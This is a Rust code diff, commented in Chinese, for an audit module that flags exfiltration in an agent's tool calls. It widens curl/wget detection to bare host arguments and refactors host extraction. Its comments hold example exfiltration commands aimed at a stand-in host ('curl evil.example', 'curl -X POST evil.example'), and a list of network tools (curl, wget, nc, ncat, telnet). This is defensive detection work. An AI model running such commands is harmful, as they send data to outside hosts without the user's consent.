@@ -329,8 +329,10 @@ fn is_exfiltration(lower: &str) -> bool {
         || is_bare_fetch_exfil(lower)
 }
 
-/// `POL-6`/D6：裸 `curl`/`wget` 外传——命令词边界命中且后随远程目标形态
-/// （`http(s)://`/`ftp://`，或 `-o`/`--output`/`>` 输出重定向）时判网络外传。
+/// `POL-6`/D6：裸 `curl`/`wget` 外传——命令词边界命中且后随远程目标形态：
+/// URL（`http(s)://`/`ftp://`）、输出重定向（`-o`/`--output`/`>`），或**裸 host 参数**
+/// （无 scheme/无重定向/无管道，如 `curl evil.example`、`curl -X POST evil.example`、
+/// `wget evil.example`），对齐 Python `_audit.py:787-813`（`APP-2`，RE-OPENED `POL-6`）。
 /// 命中外部 host 由 `is_dangerous` 的内网豁免分支放行（`internal_suffixes`）。
 fn is_bare_fetch_exfil(lower: &str) -> bool {
     let has_remote_target = |rest: &str| {
@@ -341,9 +343,84 @@ fn is_bare_fetch_exfil(lower: &str) -> bool {
             || rest.contains("--output")
             || rest.contains('>')
     };
-    ["curl", "wget"]
-        .iter()
-        .any(|verb| word_after_command(lower, verb).is_some_and(has_remote_target))
+    ["curl", "wget"].iter().any(|verb| {
+        word_after_command(lower, verb)
+            .is_some_and(|rest| has_remote_target(rest) || bare_network_target(rest).is_some())
+    })
+}
+
+/// curl/wget 需跳过其取值的选项（小写形态；`--opt=value` 自带取值不在此列）。
+const FETCH_VALUE_OPTS: &[&str] = &[
+    "-x",
+    "--request",
+    "-d",
+    "--data",
+    "--data-raw",
+    "--data-binary",
+    "--data-urlencode",
+    "-o",
+    "--output",
+    "-h",
+    "--header",
+    "-u",
+    "--user",
+    "-t",
+    "--upload-file",
+    "-a",
+    "--user-agent",
+    "-e",
+    "--referer",
+    "-b",
+    "--cookie",
+    "-f",
+    "--form",
+    "--connect-timeout",
+    "--max-time",
+];
+
+/// `APP-2`：从 curl/wget 参数串中提取裸网络目标——跳过选项及其取值后，返回首个
+/// host-like 位置参数；`wget --version` 等无位置参数返回 `None`（控制误报）。
+fn bare_network_target(rest: &str) -> Option<String> {
+    let mut toks = rest.split_whitespace();
+    while let Some(tok) = toks.next() {
+        if tok.starts_with('-') {
+            let t = tok.to_ascii_lowercase();
+            if !t.contains('=') && FETCH_VALUE_OPTS.contains(&t.as_str()) {
+                let _ = toks.next();
+            }
+            continue;
+        }
+        if looks_like_host(tok) {
+            return Some(host_only(tok));
+        }
+    }
+    None
+}
+
+/// host-like 判据：含 scheme/`.`/`:`、IPv6 括号形、`localhost` 或纯点分数字（IP）。
+fn looks_like_host(tok: &str) -> bool {
+    let t = tok.trim_matches(|c| c == '"' || c == '\'' || c == ',' || c == ';');
+    if t.is_empty() {
+        return false;
+    }
+    t.contains("://")
+        || t.contains('.')
+        || t.contains(':')
+        || t.starts_with('[')
+        || t.eq_ignore_ascii_case("localhost")
+        || (t.bytes().any(|b| b.is_ascii_digit())
+            && t.bytes().all(|b| b.is_ascii_digit() || b == b'.'))
+}
+
+/// 归一为 host 本体：剥 scheme 与路径/查询/片段，保留 `host:port`。
+fn host_only(tok: &str) -> String {
+    let t = tok.trim_matches(|c| c == '"' || c == '\'' || c == ',' || c == ';');
+    let after = t.split_once("://").map_or(t, |(_, a)| a);
+    after
+        .split(['/', '?', '#'])
+        .next()
+        .unwrap_or("")
+        .to_string()
 }
 
 /// 从 tool 参数提取网络目标 host（URL 或 `curl/wget/nc` 裸目标），不做 DNS 解析。
@@ -364,7 +441,7 @@ pub fn extract_host(args: &str) -> Option<String> {
             }
         }
     }
-    // 裸目标：`curl 8.8.8.8` / `curl evil.com`。
+    // 裸目标：`curl 8.8.8.8` / `curl evil.com` / `curl -X POST evil.example`。
     for verb in ["curl", "wget", "nc", "ncat", "telnet"] {
         let mut search = args;
         while let Some(idx) = search.find(verb) {
@@ -375,16 +452,7 @@ pub fn extract_host(args: &str) -> Option<String> {
                 continue;
             }
             let rest = search[after_verb..].trim_start();
-            if rest.starts_with('-') || rest.is_empty() {
-                search = &search[after_verb..];
-                continue;
-            }
-            let host: String = rest
-                .split([' ', '"', '\'', ';', '|', '&'].as_ref())
-                .next()
-                .unwrap_or("")
-                .to_string();
-            if !host.is_empty() && !host.starts_with("http") {
+            if let Some(host) = bare_network_target(rest) {
                 return Some(host);
             }
             search = &search[after_verb..];
@@ -420,7 +488,8 @@ pub fn is_internal_host(host: &str, internal_suffixes: &[String]) -> bool {
 
 /// 审计预检（廉价同步前缀匹配）：tool 名命中危险前缀或参数前缀出现危险命令起始
 /// 即返回 true（调用方暂停 flush，等待完整判定；未启用审计恒 false）。
-pub fn audit_precheck(enabled: bool, tool_name: &str, args_prefix: &str) -> bool {
+#[cfg(test)]
+pub(crate) fn audit_precheck(enabled: bool, tool_name: &str, args_prefix: &str) -> bool {
     if !enabled {
         return false;
     }
